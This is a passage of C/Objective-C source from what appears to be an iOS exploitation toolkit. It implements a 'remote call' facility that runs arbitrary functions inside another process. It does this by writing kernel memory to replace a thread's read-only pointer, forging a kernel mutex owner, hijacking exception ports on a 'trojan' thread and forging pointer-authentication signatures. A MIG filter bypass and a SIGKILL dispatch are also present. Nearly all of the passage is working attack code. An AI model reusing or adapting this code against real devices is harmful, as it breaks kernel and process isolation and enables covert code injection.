    uint64_t diver = 0;
    diver = (uint64_t)state.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
    
    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);
    
    exception_mask_t exceptionMask = remote_call_exception_mask();

    state.__x[0] = g_RC_dummyThreadMach;
    state.__x[1] = exceptionMask;
    state.__x[2] = exceptionPort;
    state.__x[3] = behavior;
    state.__x[4] = ARM_THREAD_STATE64;
    
    if(useMigFilterBypass)
        usleep(100000);
    
    if (!thread_set_state_wrapper(machThread, machThreadAddr,
                                  (arm_thread_state64_internal *)&state))
    {
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }
    
    if(useMigFilterBypass)
        usleep(100000);
    
    /* Forge the dummy thread's mutex owner to ourselves only while the lock
     * is actually free.  The helper parks in lck_mtx_lock on this word, so it
     * must read as "owned by us" before the helper is resumed; writing over a
     * word the helper already owns would make its lck_mtx_unlock take the
     * slow path and panic (lock_mtx.c: "unexpectedly not owned by thread"). */
    uint32_t dummyMutexBefore = thread_get_mutex(g_RC_dummyThreadAddr);
    if ((dummyMutexBefore & CND_LCK_MTX_CTID_MASK) != 0) {
        printf("[%s:%d] dummy mutex %#x not free before forge; aborting helper setup\n",
               __FUNCTION__, __LINE__, dummyMutexBefore);
        /* A stale forge owned by this thread can be released safely.  Any
         * other owner must be left untouched; in both cases, do not resume a
         * helper against an ownership state this invocation did not create. */
        release_forged_dummy_mutex("pre-forge mutex not free");
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }
    thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);

    if (!thread_resume_wrapper(machThread))
    {
        /* The helper never ran, so the forged owner is still ours; release it
         * or a later thread_mtx_lock(dummy) from this thread would trip the
         * recursive-owner panic (__lck_mtx_owned_panic). */
        release_forged_dummy_mutex("helper resume failed");
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }
    
    for (int i = 0; i < 10; i++)
    {
        /* Dispatch workqueue threads may disappear between the task-thread
         * snapshot and this helper-stack transplant.  Retrying a dead target
         * for the full two seconds only lets more candidates expire. */
        if (thread_get_task(currThread) != g_RC_taskAddr) {
            printf("[%s:%d] target thread %#llx left task during setup "
                   "attempt=%d; stopping retries\n",
                   __FUNCTION__, __LINE__, currThread, i + 1);
            break;
        }
        usleep(200000);

        if (thread_get_task(currThread) != g_RC_taskAddr) {
            printf("[%s:%d] target thread %#llx left task while helper ran "
                   "attempt=%d; stopping retries\n",
                   __FUNCTION__, __LINE__, currThread, i + 1);
            break;
        }

        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
        if (!is_kaddr_valid(kstack)) {
            printf("[%s:%d] Failed to get valid kstack (%#llx). Retry...\n",
                   __FUNCTION__, __LINE__, kstack);
            continue;
        }
        
        uint64_t kernelSP = kread64(kstack + off_arm_kernel_saved_state_sp);
        if (!is_kaddr_valid(kernelSP)) {
            printf("[%s:%d] Failed to get valid SP (%#llx). Retry...\n",
                   __FUNCTION__, __LINE__, kernelSP);
            continue;
        }
        usleep(100);

        uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
        if (!is_kaddr_valid(pageBase)) {
            printf("[%s:%d] invalid helper stack probe page %#llx\n",
                   __FUNCTION__, __LINE__, pageBase);
            continue;
        }
        char dataBuff[0x1000];
        memset(dataBuff, 0, 0x1000);
        kreadbuf(pageBase, &dataBuff, 0x1000);

        uint64_t needleVal = g_RC_dummyThreadTro;
        void *match = memmem(dataBuff, 0x1000, &needleVal, sizeof(needleVal));
        if (!match) {
            printf("[%s:%d] Couldn't find g_RC_dummyThreadTro\n", __FUNCTION__, __LINE__);
            continue;
        }
        size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
        uint64_t found = (uint64_t)foundOffset + 0x3000;
        memset(dataBuff, 0, 0x1000);
        
        bool correctTro = false;
        uint64_t checkAddr = trunc_page(kernelSP) + found + 0x18ULL;
        uint64_t checkVal  = kread64(checkAddr);
        
        uint64_t checkAddr2 = trunc_page(kernelSP) + found + 0x10ULL;   // on iPad 7(arm64)/18.3.2, offsets may be different
        uint64_t checkVal2  = kread64(checkAddr2);

        if (checkVal == exceptionMask || checkVal2 == exceptionMask) {
            correctTro = true;
        } else {
            printf("[%s:%d] Wrong tro (%#llx/%#llx != %#llx). Retry...\n",
                   __FUNCTION__, __LINE__, checkVal, checkVal2, exceptionMask);
//            printf("[%s:%d] Wrong tro = 0x%llx (kread64 from 0x%llx, trunc_page(kernelSP) = 0x%llx), Retry...\n", __FUNCTION__, __LINE__, checkVal, checkAddr, trunc_page(kernelSP));
//            khexdump(trunc_page(kernelSP), 0x4000);
//            while(1) {};
            continue;
        }
        
        if (found && correctTro) {
            if (thread_get_task(currThread) == g_RC_taskAddr) {
                uint64_t tro = thread_get_t_tro(currThread);
                if (!is_kaddr_valid(tro)) {
                    printf("[%s:%d] target thread tro invalid %#llx\n",
                           __FUNCTION__, __LINE__, tro);
                    continue;
                }
                kwrite64(trunc_page(kernelSP) + found, tro);
                success = true;
                break;
            } else {
                printf("[%s:%d] got empty tro, skip writing\n", __FUNCTION__, __LINE__);
            }
        } else {
            NSLog(@"[%s:%d] didnt find tro for 0x%llx", __FUNCTION__, __LINE__, (uint64_t)currThread);
        }
    }
    
    /* Release the forged owner only if the helper has not taken the lock
     * yet; see release_forged_dummy_mutex.  Unconditionally rewriting the
     * word here raced with the helper's lck_mtx_unlock and panicked the
     * kernel whenever the helper had already acquired the mutex. */
    release_forged_dummy_mutex("helper finished");

    thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort,
                               behavior, ARM_THREAD_STATE64);

    if(useMigFilterBypass)
        usleep(100000);

    mach_port_deallocate(mach_task_self_, machThread);
    return success;
}

bool sign_state(uint64_t signingThread, arm_thread_state64_internal *state,
                uint64_t pc, uint64_t lr)
{
    if (!state || (!pc && !lr)) return false;
    reap_dead_port_names_if_needed("sign_state");

    if(gIsPACSupported) {
        bool identityPACFallback = false;
        if (MACH_PORT_VALID(g_RC_identityThreadPort) &&
            signingThread == g_RC_identityThreadAddr) {
            if (!g_RC_identityConverterUnavailable) {
                bool converted = thread_convert_sign_state_for_target(
                    g_RC_identityThreadPort, state, pc, lr);
                if (converted) {
                    g_RC_identityConversionCount++;
                    return true;
                }
                g_RC_identityConversionFailures++;
                g_RC_identityConverterUnavailable = true;
                printf("[RemoteCall] identity-delivered public converter "
                       "rejected the cross-task right thread=%#llx "
                       "port=0x%x pc=%#llx lr=%#llx; trying the existing "
                       "physical KRW PAC-context fallback\n",
                       signingThread, g_RC_identityThreadPort, pc, lr);
            }
            identityPACFallback = true;
        }

        uint64_t diver = 0;
        diver = (uint64_t)state->__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
        uint64_t discPC = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("pc"));
        uint64_t discLR = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("lr"));
        
        if (pc) {
            uint32_t flags = state->__flags;
            flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
            state->__flags = flags;
            state->__pc = remote_pac(signingThread, pc, discPC);
            if (!state->__pc || state->__pc == UINT64_MAX) {
                if (identityPACFallback)
                    g_RC_identityPACFallbackFailures++;
                return false;
            }
        }
        if (lr) {
            uint32_t flags = state->__flags;
            flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                       __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
            state->__flags = flags;
            state->__lr = remote_pac(signingThread, lr, discLR);
            if (!state->__lr || state->__lr == UINT64_MAX) {
                if (identityPACFallback)
                    g_RC_identityPACFallbackFailures++;
                return false;
            }
        }
        if (identityPACFallback) g_RC_identityPACFallbackCount++;
        return true;
    }
    
    if(!gIsPACSupported) {
        if (pc) state->__pc = pc;
        if (lr) state->__lr = lr;
    }
    return true;
}

bool remote_call_current_success(void)
{
    return g_RC_success;
}

bool remote_call_lab_backend_opted_in(void)
{
    return cnd_lab_remotecall_opted_in();
}

bool remote_call_lab_prepare_bundle_access(void)
{
    return cnd_lab_remotecall_consume_bundle_file_token();
}

bool remote_call_lab_copy_target_bundle_path(char *path, size_t pathSize)
{
    return cnd_lab_remotecall_copy_target_bundle_path(path, pathSize);
}

bool remote_call_uses_lab_backend(void)
{
    return cnd_lab_remotecall_has_state(&g_RC_labClient);
}

uint64_t remote_call_current_io_failure_count(void)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    uint64_t count = g_RC_ioFailures;
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return count;
}

uint64_t remote_call_total_stable_call_count(void)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    uint64_t count = g_RC_stableCallsTotal;
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return count;
}

uint64_t remote_call_session_stable_call_count(RemoteCallSession *session)
{
    if (!session) return 0;
    /* _state is embedded in the session and only made current while pushed, so
     * the count stays readable after the pop that ends a session window. */
    return [session remoteCallStatePointer]->stableCalls;
}

int remote_call_current_pid(void)
{
    return g_RC_pid;
}

uint64_t remote_call_current_proc(void)
{
    return g_RC_procAddr;
}

uint64_t remote_call_current_task(void)
{
    return g_RC_taskAddr;
}

RemoteCallTerminalDispatchStatus remote_call_dispatch_self_sigkill(
    int expectedPID,
    uint64_t expectedProc,
    uint64_t expectedTask,
    RemoteCallTerminalDispatchReport *reportOut)
{
    RemoteCallTerminalDispatchReport report = {0};
    report.status = RemoteCallTerminalDispatchRejected;
    report.expectedPID = expectedPID;
    report.expectedProc = expectedProc;
    report.expectedTask = expectedTask;
    report.currentPID = g_RC_pid;
    report.currentProc = g_RC_procAddr;
    report.currentTask = g_RC_taskAddr;
    report.transportHealthy = g_RC_success;
    report.sessionBound = g_RC_pid > 0 && g_RC_procAddr && g_RC_taskAddr;
    report.expectedPIDBound = report.sessionBound && expectedPID == g_RC_pid;
    report.expectedProcBound = report.sessionBound && expectedProc == g_RC_procAddr;
    report.expectedTaskBound = report.sessionBound && expectedTask == g_RC_taskAddr;

    uint64_t liveProc = expectedPID > 0 ? proc_find(expectedPID) : 0;
    uint64_t liveTask = liveProc && liveProc != UINT64_MAX
        ? proc_task(liveProc) : 0;
    report.liveKernelIdentityBound = report.expectedPIDBound &&
        report.expectedProcBound && report.expectedTaskBound &&
        liveProc == expectedProc && liveTask == expectedTask;
    report.killSymbolResolved = dlsym(RTLD_DEFAULT, "kill") != NULL;

    if (!report.sessionBound || !report.expectedPIDBound ||
        !report.expectedProcBound || !report.expectedTaskBound ||
        !report.liveKernelIdentityBound || !report.transportHealthy ||
        !report.killSymbolResolved) {
        snprintf(report.reason, sizeof(report.reason), "%s",
                 !report.sessionBound ? "session-unbound" :
                 !report.expectedPIDBound ? "pid-mismatch" :
                 !report.expectedProcBound ? "proc-mismatch" :
                 !report.expectedTaskBound ? "task-mismatch" :
                 !report.liveKernelIdentityBound ? "kernel-identity-drift" :
                 !report.transportHealthy ? "transport-unhealthy" :
                 "kill-symbol-unavailable");
        if (reportOut) *reportOut = report;
        return report.status;
    }

    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    // Dispatch after receiving the synthetic-thread exception, then do not
    // wait for a return that SIGKILL cannot produce. Dispatch is not exit
    // proof; Settings must prove this exact proc/task incarnation is gone.
    (void)do_remote_call_stable_internal(
        -1, "kill", (uint64_t)expectedPID, (uint64_t)SIGKILL,
        0, 0, 0, 0, 0, 0);
    report.oneWayDispatched = g_RC_success;
    pthread_mutex_unlock(&g_universal_ipc_mutex);

    if (report.oneWayDispatched) {
        report.status = RemoteCallTerminalDispatchPossible;
        snprintf(report.reason, sizeof(report.reason), "%s",
                 "one-way-self-sigkill-dispatched");
    } else {
        snprintf(report.reason, sizeof(report.reason), "%s",
                 "terminal-dispatch-failed");
    }
    report.ownerExitProven = false;
    if (reportOut) *reportOut = report;
    return report.status;
}

int remote_call_set_stable_timeout_floor_ms(int timeoutMS)
{
    int previous = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    g_RC_stableExceptionTimeoutFloorMS = timeoutMS > 0 ? timeoutMS : 10000;
    return previous;
}

uint64_t do_remote_call_temp(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    uint64_t res = do_remote_call_temp_internal(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

static uint64_t do_remote_call_temp_internal(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    remote_call_note_stable_call(name);
    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
    uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));

    CNDRemoteCallOriginalThreadException firstEvent = {0};
    if (!remote_call_wait_original_thread_exception(
            g_RC_firstExceptionPort, &firstEvent, newTimeout)) {
        printf("[%s:%d] Don't receive first exception on original thread\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
        remote_call_note_stable_failure(name, "original-thread first exception timeout");
        return 0;
    }
    ExceptionMessage *exc = &firstEvent.exception;

    arm_thread_state64_internal interruptedState = exc->threadState;
    exc->threadState.__x[0] = x0;
    exc->threadState.__x[1] = x1;
    exc->threadState.__x[2] = x2;
    exc->threadState.__x[3] = x3;
    exc->threadState.__x[4] = x4;
    exc->threadState.__x[5] = x5;
    exc->threadState.__x[6] = x6;
    exc->threadState.__x[7] = x7;
    uint64_t completionTrap = g_RC_identityHandlerRetained
        ? g_RC_identityTrapAddress : FAKE_LR_TROJAN_CREATOR;
    if (!sign_state(g_RC_trojanThreadAddr, &exc->threadState, pcAddr,
                    completionTrap)) {
        g_RC_success = false;
        remote_call_note_stable_failure(
            name, "original-thread target conversion failed");
        (void)remote_call_reply_original_thread_exception(
            &firstEvent, &interruptedState);
        return 0;
    }
    if (!remote_call_reply_original_thread_exception(
            &firstEvent, &exc->threadState)) {
        g_RC_success = false;
        remote_call_note_stable_failure(
            name, "original-thread dispatch exception reply failed");
        return 0;
    }

    if (timeout < 0) {
        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
        return 0;
    }

    CNDRemoteCallOriginalThreadException secondEvent = {0};
    if (!remote_call_wait_original_thread_exception(
            g_RC_firstExceptionPort, &secondEvent, newTimeout)) {
        printf("[%s:%d] Don't receive second exception on original thread\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
        remote_call_note_stable_failure(name, "original-thread second exception timeout");
        return 0;
    }
    ExceptionMessage *exc2 = &secondEvent.exception;
    uint64_t retValue = exc2->threadState.__x[0];
    uint64_t completionPC = native_strip(exc2->threadState.__pc);
    if (completionPC != completionTrap) {
        printf("[RemoteCall] unexpected original-thread completion "
               "function=%s exception=%u code=(%#llx,%#llx) "
               "pc=%#llx stripped-pc=%#llx lr=%#llx x0=%#llx\n",
               name, exc2->exception,
               exc2->codeFirst, exc2->codeSecond,
               exc2->threadState.__pc, completionPC,
               exc2->threadState.__lr, retValue);
    }
    if (!remote_call_reply_original_thread_exception(
            &secondEvent, &exc2->threadState)) {
        g_RC_success = false;
        remote_call_note_stable_failure(
            name,
            completionPC == completionTrap
                ? "original-thread completion reply right died"
                : "original-thread fault reply right died");
        return 0;
    }
    if (remote_call_should_log_result(name, false))
        printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
    if(strcmp(name, "getpid") == 0 && retValue == 0) {
        printf("[%s:%d] getpid failed\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
        remote_call_note_stable_failure(name, "getpid returned zero");
    }
    return retValue;
}

uint64_t do_remote_call_stable(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    uint64_t res = do_remote_call_stable_internal(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

static uint64_t do_remote_call_stable_internal(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    if (remote_call_uses_lab_backend()) {
        remote_call_note_stable_call(name);
        uint64_t arguments[8] = { x0, x1, x2, x3, x4, x5, x6, x7 };
        uint64_t value = 0;
        int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0
            ? g_RC_stableExceptionTimeoutFloorMS : 10000;
        int effectiveTimeout = timeout < 0 ? timeout
            : (floorTimeout > timeout ? floorTimeout : timeout);
        int result = cnd_lab_remotecall_call_symbol(
            &g_RC_labClient, effectiveTimeout, name, arguments, &value);
        if (result != 0) {
            g_RC_success = false;
            remote_call_note_stable_failure(name, strerror(result));
            printf("[RemoteCall] lab symbol call failed target=%s symbol=%s "
                   "error=%d (%s)\n",
                   g_RC_labClient.process, name ?: "(null)", result,
                   strerror(result));
            return 0;
        }
        return value;
    }

    if (!g_RC_creatingExtraThread)
        return do_remote_call_temp_internal(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);

    uint64_t pcAddr = (uint64_t)dlsym(RTLD_DEFAULT, name);
    if (!pcAddr) {
        printf("[%s:%d] Unable to find symbol: %s\n", __FUNCTION__, __LINE__, name);
        g_RC_success = false;
        remote_call_note_stable_call(name);
        remote_call_note_stable_failure(name, "symbol lookup failed");
        return 0;
    }
    return do_remote_call_stable_addr_internal(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
}

uint64_t do_remote_call_stable_addr(int timeout, uint64_t pcAddr, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    uint64_t res = do_remote_call_stable_addr_internal(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

static uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    remote_call_note_stable_call(name ?: "(addr-call)");

    if (remote_call_uses_lab_backend()) {
        uint64_t arguments[8] = { x0, x1, x2, x3, x4, x5, x6, x7 };
        uint64_t value = 0;
        int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0
            ? g_RC_stableExceptionTimeoutFloorMS : 10000;
        int effectiveTimeout = timeout < 0 ? timeout
            : (floorTimeout > timeout ? floorTimeout : timeout);
        int result = cnd_lab_remotecall_call_address(
            &g_RC_labClient, effectiveTimeout, pcAddr, arguments, &value);
        if (result != 0) {
            g_RC_success = false;
            remote_call_note_stable_failure(
                name ?: "(addr-call)", strerror(result));
            printf("[RemoteCall] lab address call failed target=%s address=%#llx "
                   "error=%d (%s)\n",
                   g_RC_labClient.process, pcAddr, result, strerror(result));
            return 0;
        }
        return value;
    }

    if (!g_RC_creatingExtraThread)
        return 0;

    if (!pcAddr) {
        printf("[%s:%d] NULL function pointer: %s\n", __FUNCTION__, __LINE__, name ?: "(addr-call)");
        g_RC_success = false;
        remote_call_note_stable_failure(name ?: "(addr-call)", "null function pointer");
        return 0;
    }
    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;

    ExceptionMessage exc;
    if (!wait_exception(g_RC_secondExceptionPort, &exc, newTimeout, false)) {
        printf("[%s:%d] Don't receive first exception on new thread\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
        remote_call_note_stable_failure(name ?: "(addr-call)", "synthetic-thread first exception timeout");
        return 0;
    }

    arm_thread_state64_internal interruptedState = exc.threadState;
    // Running bootstrap pthreads first trap at their natural return from
    // usleep(). Preserve that exact, already kernel-signed state before the
    // first synthetic call. Teardown can later return the pthread to its real
    // start routine instead of injecting pthread_exit from a fabricated PC.
    if (g_RC_callThreadNaturalReturn && !g_RC_callThreadResumeStateValid) {
        memcpy(&g_RC_callThreadResumeState, &exc.threadState,
               sizeof(g_RC_callThreadResumeState));
        g_RC_callThreadResumeStateValid = true;
        printf("[RemoteCall] Captured synthetic thread natural return state pc=%#llx lr=%#llx flags=%#x.\n",
               g_RC_callThreadResumeState.__pc,
               g_RC_callThreadResumeState.__lr,
               g_RC_callThreadResumeState.__flags);
    }

    exc.threadState.__x[0] = x0;
    exc.threadState.__x[1] = x1;
    exc.threadState.__x[2] = x2;
    exc.threadState.__x[3] = x3;
    exc.threadState.__x[4] = x4;
    exc.threadState.__x[5] = x5;
    exc.threadState.__x[6] = x6;
    exc.threadState.__x[7] = x7;
    // PAC keys are thread-scoped. Calls running on the synthetic pthread must
    // be signed with that pthread's keys, not the originally trapped worker's.
    if (!sign_state(g_RC_callThreadAddr, &exc.threadState, pcAddr,
                    FAKE_LR_TROJAN)) {
        g_RC_success = false;
        remote_call_note_stable_failure(
            name ?: "(addr-call)",
            "synthetic-thread target signing failed");
        (void)reply_with_state(&exc, &interruptedState);
        return 0;
    }
    if (!reply_with_state(&exc, &exc.threadState)) {
        g_RC_success = false;
        remote_call_note_stable_failure(
            name ?: "(addr-call)",
            "synthetic-thread dispatch exception reply failed");
        return 0;
    }
    // From this point until the completion exception is received, the target
    // pthread is executing with FAKE_LR_TROJAN as its return address. Keep
    // this explicit: a timeout is not proof that the call stopped running.
    g_RC_syntheticCallInFlight = true;

    if (timeout < 0) {
        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
        return 0;
    }

    ExceptionMessage exc2;
    if (!wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false)) {
        printf("[%s:%d] Don't receive second exception on new thread "
               "function=%s timeout=%dms\n",
               __FUNCTION__, __LINE__, name ?: "(addr-call)", newTimeout);
        g_RC_success = false;
        remote_call_note_stable_failure(name ?: "(addr-call)", "synthetic-thread second exception timeout");
        return 0;
    }
    g_RC_syntheticCallInFlight = false;
    uint64_t retValue = exc2.threadState.__x[0];
    uint64_t completionPC = native_strip(exc2.threadState.__pc);
    if (completionPC != FAKE_LR_TROJAN) {
        printf("[RemoteCall] unexpected synthetic completion "
               "function=%s exception=%u code=(%#llx,%#llx) "
               "pc=%#llx stripped-pc=%#llx lr=%#llx x0=%#llx\n",
               name ?: "(addr-call)", exc2.exception,
               exc2.codeFirst, exc2.codeSecond,
               exc2.threadState.__pc, completionPC,
               exc2.threadState.__lr, retValue);
    }
    if (!reply_with_state(&exc2, &exc2.threadState)) {
        g_RC_success = false;
        remote_call_note_stable_failure(
            name ?: "(addr-call)",
            completionPC == FAKE_LR_TROJAN
                ? "synthetic-thread completion reply right died"
                : "synthetic-thread fault reply right died");
        return 0;
    }
    if (remote_call_should_log_result(name, true))
        printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name ?: "(addr-call)", retValue, retValue);
    return retValue;
}

bool restore_trojan_thread(arm_thread_state64_internal *state)
{
    CNDRemoteCallOriginalThreadException event = {0};
    int restoreTimeoutMS = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 20000;
    if (restoreTimeoutMS < 1000) restoreTimeoutMS = 1000;
    if (!remote_call_wait_original_thread_exception(
            g_RC_firstExceptionPort, &event, restoreTimeoutMS)) {
        printf("[%s:%d] Failed to receive exception while restoring within %dms\n",
               __FUNCTION__, __LINE__, restoreTimeoutMS);
        return false;
    }
    ExceptionMessage *exc = &event.exception;
    
    state->__flags = exc->threadState.__flags;
    if (!sign_state(g_RC_trojanThreadAddr, state,
                    state->__pc, state->__lr)) {
        printf("[RemoteCall] Failed to convert original target state during restore.\n");
        (void)remote_call_reply_original_thread_exception(
            &event, &exc->threadState);
        return false;
    }
    return remote_call_reply_original_thread_exception(&event, state);
}

static bool remote_call_target_contains_thread(uint64_t targetThread)
{
    // This predicate is used as a safety gate before destroying an exception
    // port. Any malformed or truncated task-thread walk must therefore mean
    // "possibly still present", never "confirmed gone".
    if (!g_RC_taskAddr || !targetThread) return true;

    uint64_t queueHead = g_RC_taskAddr + off_task_threads_next;
    uint64_t thread = kread64(queueHead);
    for (NSUInteger i = 0; i < 256; i++) {
        if (thread == queueHead) return false;
        if (!is_kaddr_valid(thread)) return true;
        if (thread == targetThread) return true;
        uint64_t next = kread64(thread + off_thread_task_threads_next);
        if (!next || next == UINT64_MAX || next == thread) return true;
        thread = next;
    }
    return true;
}

static bool remote_call_target_identity_is_live(void)
{
    if (g_RC_pid <= 1 || !g_RC_procAddr || !g_RC_taskAddr) return false;
    uint64_t liveProc = proc_find(g_RC_pid);
    return liveProc == g_RC_procAddr && proc_task(liveProc) == g_RC_taskAddr;
}

static bool remote_call_restore_natural_state_from_exception(
    ExceptionMessage *exc)
{
    if (!exc || !g_RC_callThreadNaturalReturn ||
        !g_RC_callThreadResumeStateValid || !g_RC_callThreadAddr) {
        printf("[RemoteCall] Synthetic thread has no captured natural return state; refusing injected teardown.\n");
        return false;
    }

    // Restore the captured natural control flow, but refresh the flags from
    // the exception currently being answered and re-sign PC/LR for this
    // pthread. Kernel-produced signatures from the earlier guard delivery are
    // not reusable at a later exception handoff.
    arm_thread_state64_internal resumeState = g_RC_callThreadResumeState;
    resumeState.__flags = exc->threadState.__flags;
    if (!sign_state(g_RC_callThreadAddr, &resumeState,
                    resumeState.__pc, resumeState.__lr)) {
        printf("[RemoteCall] Failed to sign synthetic natural return state.\n");
        return false;
    }
    printf("[RemoteCall] Restoring synthetic natural state pc=%#llx lr=%#llx flags=%#x from-current-flags=%#x.\n",
           g_RC_callThreadResumeState.__pc,
           g_RC_callThreadResumeState.__lr,
           resumeState.__flags,
           exc->threadState.__flags);
    if (!reply_with_state(exc, &resumeState)) return false;
    g_RC_syntheticCallInFlight = false;

    // Do not destroy the exception receive right until the pthread has left
    // the target task. If it did fault again, keeping the port alive is safer
    // than turning a recoverable daemon-thread failure into a process kill.
    for (int i = 0; i < 200; i++) {
        if (!remote_call_target_contains_thread(g_RC_callThreadAddr)) {
            printf("[RemoteCall] Synthetic pthread returned through its natural start routine and exited.\n");
            return true;
        }
        usleep(10000);
    }

    printf("[RemoteCall] Synthetic pthread did not exit after natural-state restore; retaining its exception port.\n");
    return false;
}

static bool remote_call_drain_in_flight_synthetic_call_internal(int timeoutMS)
{
    if (!g_RC_syntheticCallInFlight) return true;
    if (!g_RC_creatingExtraThread ||
        !MACH_PORT_VALID(g_RC_secondExceptionPort)) return false;

    ExceptionMessage exc;
    if (!wait_exception(g_RC_secondExceptionPort, &exc,
                        timeoutMS > 0 ? timeoutMS : 1000, false)) {
        return false;
    }

    uint64_t completionPC = native_strip(exc.threadState.__pc);
    if (completionPC != FAKE_LR_TROJAN) {
        printf("[RemoteCall] Delayed synthetic call faulted instead of returning "
               "pc=%#llx stripped-pc=%#llx; retiring its pthread through the captured natural state.\n",
               exc.threadState.__pc, completionPC);
        bool restored = remote_call_restore_natural_state_from_exception(&exc);
        if (restored) {
            // The synthetic pthread is gone and the original target thread was
            // restored during bootstrap. No further target-side teardown is
            // possible or necessary; dropping local state is now safe. The
            // one-page scratch mapping is reclaimed with the target process.
            abandon_remote_call_internal();
        }
        return restored;
    }

    // Re-establish the normal ready trap. destroy_remote_call_internal() can
    // now issue its bounded munmap and then return the synthetic pthread to
    // the captured usleep return state.
    if (!reply_with_state(&exc, &exc.threadState)) return false;
    g_RC_syntheticCallInFlight = false;
    g_RC_success = true;
    printf("[RemoteCall] Delayed synthetic call completion drained safely; session is ready for teardown.\n");
    return true;
}

static bool restore_call_thread_natural_state(void)
{
    if (!g_RC_callThreadNaturalReturn ||
        !g_RC_callThreadResumeStateValid ||
        !g_RC_callThreadAddr) {
        printf("[RemoteCall] Synthetic thread has no captured natural return state; refusing injected teardown.\n");
        return false;
    }

    int timeoutMS = g_RC_stableExceptionTimeoutFloorMS > 0
        ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    ExceptionMessage exc;
    if (!wait_exception(g_RC_secondExceptionPort, &exc, timeoutMS, false)) {
        printf("[RemoteCall] Failed to receive synthetic thread cleanup exception within %dms.\n",
               timeoutMS);
        return false;
    }

    return remote_call_restore_natural_state_from_exception(&exc);
}

void abandon_remote_call(void) {
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    abandon_remote_call_internal();
    pthread_mutex_unlock(&g_universal_ipc_mutex);
}

